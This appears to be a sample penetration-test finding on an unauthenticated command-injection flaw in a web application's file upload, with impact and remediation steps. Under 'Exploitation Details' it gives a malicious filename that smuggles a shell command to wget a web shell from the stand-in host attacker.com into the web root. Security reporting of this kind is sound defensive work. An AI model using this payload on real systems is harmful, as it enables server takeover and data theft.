### Example Finding: Unauthenticated Remote Code Execution

**Severity:** CRITICAL  
**CVSS Score:** 9.8  
**Category:** Code Execution  
**CWE ID:** CWE-78

#### Description
A critical remote code execution vulnerability was identified in the web application that allows unauthenticated attackers to execute arbitrary system commands on the underlying server.

#### Affected Systems
- **Web Server** (192.168.1.10) - Production web application server
- **Database Server** (192.168.1.11) - Connected database server

#### Exploitation Details
The vulnerability exists in the file upload functionality where user-supplied filenames are passed directly to system commands without proper sanitization. By crafting a malicious filename containing shell metacharacters, an attacker can execute arbitrary commands.

**Exploit Payload:**
```bash
filename="test.jpg; wget http://attacker.com/shell.php -O /var/www/html/shell.php; #"
```

**Result:** Remote shell access with web server privileges

#### Evidence
- Successfully uploaded malicious file
- Executed system commands (id, whoami, ps aux)  
- Established persistent backdoor access
- Accessed configuration files and database credentials

#### Impact Assessment
**Technical Impact:**
- Confidentiality: HIGH - Complete server access
- Integrity: HIGH - Ability to modify any file
- Availability: MEDIUM - Potential for service disruption

**Business Impact:**
This vulnerability allows complete compromise of the web server, potentially leading to:
- Theft of customer data and personal information
- Modification of website content and functionality
- Use of server for botnet or cryptocurrency mining
- Lateral movement to other network systems

#### Remediation
1. Implement strict input validation for all user uploads
2. Use a whitelist approach for allowed file extensions
3. Store uploaded files outside the web root directory
4. Run web application with minimal system privileges
5. Deploy Web Application Firewall (WAF) with upload restrictions
6. Implement file type validation using file signatures
7. Add comprehensive logging for all file upload activities

#### Verification Steps
1. Test file upload with various malicious payloads
2. Verify uploaded files cannot execute system commands
3. Confirm files are stored in secure location
4. Test with different file extensions and MIME types
5. Validate logging captures all upload attempts
